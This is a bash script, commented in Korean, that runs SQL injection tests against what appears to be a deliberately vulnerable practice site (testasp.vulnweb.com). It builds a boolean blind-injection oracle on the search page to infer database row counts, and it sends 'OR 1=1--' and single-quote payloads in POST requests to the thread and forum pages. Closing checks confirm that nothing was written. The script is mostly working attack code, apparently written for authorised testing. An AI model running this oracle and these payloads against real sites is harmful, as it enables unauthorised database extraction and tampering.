#!/usr/bin/env bash
# Round 7 Part B5 — POST 경로(삭제 분기 위치) 검증, 쓰기 불가능 형태로만.
#  · id=9 OR 1=1--  → 카운트 쿼리는 실제 실행되지만(전체 게시글 수), VALUES 절이 -- 로 절단되어
#                     INSERT 는 문법 오류로 반드시 실패 → 쓰기 0건 보장.
#  · id=9'          → 첫 SELECT 에서 SQL 오류 → 스크립트 중단 → INSERT 미도달.
set -u
BASE="http://testasp.vulnweb.com"
D="$(cd "$(dirname "$0")" && pwd)"; OUT="$D/out"; JAR="$OUT/b_session.jar"
CURL=(curl -s --noproxy '*' --max-time 30 -b "$JAR")
OUR=$(cat "$OUT/b_our_thread_id.txt" 2>/dev/null || echo 9)
q() { printf '%s' "$1" | sed 's/ /%20/g; s/'"'"'/%27/g'; }
oracle() { "${CURL[@]}" -G --data-urlencode "tfSearch=zzq')>0 OR ($1))--" "$BASE/search.asp" | grep -o "class='posttext'" | wc -l; }
pc() { grep -o "class='posttext'" "$1" 2>/dev/null | wc -l; }

band() { echo "$(oracle '(SELECT COUNT(*) FROM posts)>20') $(oracle '(SELECT COUNT(*) FROM posts)>100') $(oracle '(SELECT COUNT(*) FROM threads)>100')"; }

echo "### F0. 실행 전 밴드 (joins>20 | posts>100 | threads>100)"
B=$(band); echo "  $B"
echo "  우리 스레드 게시글 수: $(pc "$OUT/e_after_ourthread.html")"

echo
echo "### F1. POST showthread.asp  id=$OUR OR 1=1--   (우리 스레드; INSERT 는 -- 절단으로 불가)"
"${CURL[@]}" -o "$OUT/f_post_t_orall.html" -w "  code=%{http_code} size=%{size_download}\n" \
  -X POST "$BASE/showthread.asp?id=$(q "$OUR OR 1=1--")" \
  --data-urlencode 'tfSubject=RT7-OWN-POST-INJ-A' --data-urlencode 'tfText=inj A'
echo "### F2. POST showthread.asp  id=$OUR'         (우리 스레드; 첫 SELECT 오류로 중단)"
"${CURL[@]}" -o "$OUT/f_post_t_err.html" -w "  code=%{http_code} size=%{size_download}\n" \
  -X POST "$BASE/showthread.asp?id=$(q "$OUR'")" \
  --data-urlencode 'tfSubject=RT7-OWN-POST-INJ-B' --data-urlencode 'tfText=inj B'
echo "### F3. POST showforum.asp   id=0 OR 1=1--    (우리 스레드가 속한 포럼; 동일 보장)"
"${CURL[@]}" -o "$OUT/f_post_f_orall.html" -w "  code=%{http_code} size=%{size_download}\n" \
  -X POST "$BASE/showforum.asp?id=$(q "0 OR 1=1--")" \
  --data-urlencode 'tfSubject=RT7-OWN-THREAD-INJ' --data-urlencode 'tfText=inj thread'

echo
echo "### F4. 무결성 (실행 후)"
A=$(band); echo "  밴드 before: $B"; echo "  밴드 after : $A"
[ "$B" = "$A" ] && echo "  → 게시글/스레드 총량 변화 없음 ✓" || echo "  → ★총량 변화 있음 — 원인 규명 필요"
"${CURL[@]}" -o "$OUT/f_after_ourthread.html" "$BASE/showthread.asp?id=$OUR"
echo "  우리 스레드 게시글 수: $(pc "$OUT/f_after_ourthread.html") (3이면 추가 없음)"
for u in "showthread.asp?id=0:thread0" "showthread.asp?id=2:thread2" "showforum.asp?id=1:forum1"; do
  url="${u%%:*}"; nm="${u##*:}"
  "${CURL[@]}" -o "$OUT/f_after_$nm.html" "$BASE/$url"
  a=$(md5sum "$OUT/b_before_$nm.html" | cut -d' ' -f1); b=$(md5sum "$OUT/f_after_$nm.html" | cut -d' ' -f1)
  [ "$a" = "$b" ] && printf "  %-10s 변경없음\n" "$nm" || printf "  %-10s ★변경됨\n" "$nm"
done
"${CURL[@]}" -o "$OUT/f_after_default.html" "$BASE/Default.asp"
echo "  --- Default.asp 차이(스레드/포스트 수 표시가 늘어난 것인지 확인) ---"
diff <(sed 's/[0-9]\+/N/g' "$OUT/b_before_default.html") <(sed 's/[0-9]\+/N/g' "$OUT/f_after_default.html") >/dev/null \
  && echo "  숫자만 다른 것 아님 — 구조 동일(카운트만 변화) ✓" || echo "  ★구조 변화 있음(검토 필요)"
diff "$OUT/b_before_default.html" "$OUT/f_after_default.html" | head -12
